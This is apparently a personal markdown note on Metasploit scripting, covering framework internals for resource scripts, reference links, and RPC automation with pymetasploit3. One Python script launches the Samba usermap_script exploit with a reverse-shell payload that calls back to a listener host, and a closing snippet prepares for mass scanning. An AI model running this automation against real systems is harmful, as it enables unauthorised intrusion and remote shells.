---
title: Metasploit scripting and more
created: '2024-03-31T04:25:36.000Z'
modified: '2024-05-30T07:14:57.468Z'
---

# Metasploit scripting and more

you typically need to do this before importing useful metasploit ruby libraries:

```ruby
$LOAD_PATH << './lib'
require 'rex'
require 'msf'
require 'msfenv'
```

the way metasploit loads resource script:

```ruby
# file: lib/msf/base/sessions/command_shell.rb
  def execute_file(full_path, args)
    if File.extname(full_path) == '.rb'
      Rex::Script::Shell.new(self, full_path).run(args)
    else
      load_resource(full_path) # usually *.rc files
    end
  end

```

the `Shell.new`:

```ruby
# lib/rex/shell/base.rb
  def run(args=[])
    self.args = args = args.flatten
    begin
      eval(::File.read(self.path, ::File.size(self.path)), binding )
    rescue ::Interrupt
    rescue ::Rex::Script::Completed
    rescue ::Exception => e
      self.error = e
      raise e
    end
  end

```
the  `load_resource`:

```ruby
# file: lib/rex/ui/text/resource.rb

# -*- coding: binary -*-
require 'erb'

module Rex
module Ui
module Text

module Resource

  # Processes a resource script file for the console.
  #
  # @param path [String] Path to a resource file to run
  # @return [void]
  def load_resource(path)
    if path == '-'
      resource_file = $stdin.read
      path = 'stdin'
    elsif ::File.exist?(path)
      resource_file = ::File.read(path)
    else
      print_error("Cannot find resource script: #{path}")
      return
    end

    # Process ERB directives first
    print_status "Processing #{path} for ERB directives."
    erb = ERB.new(resource_file)
    processed_resource = erb.result(binding)

    lines = processed_resource.each_line.to_a
    bindings = {}
    while lines.length > 0

      line = lines.shift
      break if not line
      line.strip!
      next if line.length == 0
      next if line =~ /^#/

      # Pretty soon, this is going to need an XML parser :)
      # TODO: case matters for the tag and for binding names
      if line =~ /<ruby/
        if line =~ /\s+binding=(?:'(\w+)'|"(\w+)")(>|\s+)/
          bin = ($~[1] || $~[2])
          bindings[bin] = binding unless bindings.has_key? bin
          bin = bindings[bin]
        else
          bin = binding
        end
        buff = ''
        while lines.length > 0
          line = lines.shift
          break if not line
          break if line =~ /<\/ruby>/
          buff << line
        end
        if ! buff.empty?
          print_status("resource (#{path})> Ruby Code (#{buff.length} bytes)")
          begin
            eval(buff, bin)
          rescue ::Interrupt
            raise $!
          rescue ::Exception => e
            print_error("resource (#{path})> Ruby Error: #{e.class} #{e} #{e.backtrace}")
          end
        end
      else
        print_line("resource (#{path})> #{line}")
        run_single(line)
      end
    end
  end

end

end
end
end

```

---

vulnerability scanners:

https://dradis.com/ce/

nessus

nexpose

openvas

---

[metasploit-framework](https://rubygems.org/gems/metasploit-framework) is a ruby gem.

---

https://www.infosecmatter.com/metasploit-module-library/

https://rubyfu.net/module-0x5-or-exploitation-kung-fu/metasploit/auxiliary-module

---

[mad-metasploit](https://github.com/hahwul/mad-metasploit) custom metasploit scripts

---

[metasploit unleashed](https://www.offsec.com/metasploit-unleashed/)

[official metasploit documentation](https://docs.metasploit.com/)

---

metasploit has enabled ssl by default. http will not work.

install package:

```bash
pip3 install pymetasploit3
```

launch metasploit background rpc service:
```bash
# get help
msfrpcd -h
# start background service
msfrpcd -P lazero
# or if you want foreground service
msfrpcd -P lazero -f
```


run script:

```python
from pymetasploit3.msfrpc import MsfRpcClient
import os

PWD = "lazero"

custom_module_path = "custom_msf_module"
assert os.path.exists(custom_module_path), (
    "Custom module path not found at: '%s'" % custom_module_path
)

# write custom python modules with:
# https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-external-python-modules.html


client = MsfRpcClient(
    password=PWD, ssl=True
)  # requires ssl by default. otherwise won't work

# the module structure must be identical to the one at , otherwise it will not load.
client.core.addmodulepath(os.path.abspath(custom_module_path))

exploit_id = "multi/samba/usermap_script"
exp_mod = client.modules.use("exploit", exploit_id)

RHOST = "172.16.194.172"
LHOST = "172.16.194.163"

exp_mod.runoptions["RHOST"] = RHOST  # this host is not running.
exp_mod.runoptions["PAYLOAD"] = "cmd/unix/reverse"
exp_mod.runoptions["LHOST"] = LHOST

msf_console = (
    client.consoles.console()
)  # you can manually read/write instead of using below method.
# timeout: 301 seconds.
exploit_run_output = msf_console.run_module_with_output(exp_mod)  # str
print(exploit_run_output)  # now have output. but still it is not streaming.
# you may want to overwrite the original implementation. the data is actually produced step by step.

run_output_file = "samba_usermap_script_output.log"
with open(run_output_file, "w+") as f:
    f.write(exploit_run_output)
print("[metasploit]", "output file saved at:", run_output_file)
# thank you very much.

```

---

To do mass scanning, first we need to obtain the default RPORT for each exploit.

```python
module_types = ['exploits','auxiliary', "encoders", "nops", "payloads", 'post']

for mt_plural in module_types:
    module_type = mt_plural.rstrip('s')
    for name in all_module_names:
        mod = client.modules.use(module_type, name)
        # get default RPORT
        default_rport = mod.runoptions.get("RPORT", None)
```
